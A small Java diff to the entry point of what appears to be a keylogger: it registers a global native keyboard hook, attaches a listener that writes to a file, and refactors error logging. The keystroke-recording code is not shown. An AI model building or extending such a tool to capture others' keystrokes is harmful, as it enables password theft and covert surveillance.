@@ -4,8 +4,12 @@ import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 
 import java.io.IOException;
+import java.util.logging.Level;
+import java.util.logging.Logger;
 
 public class Main {
+
+    private static final Logger LOG = Logger.getLogger(Main.class.getName());
 
     public static void main(String[] args) {
 
@@ -13,9 +17,9 @@ public class Main {
 
         try {
             GlobalScreen.registerNativeHook();
-            GlobalScreen.addNativeKeyListener(new Logger(filePath));
+            GlobalScreen.addNativeKeyListener(new KeyListener(filePath));
         } catch (NativeHookException | IOException e) {
-            e.printStackTrace();
+            LOG.log(Level.SEVERE, e.getMessage(), e);
         }
     }
 }
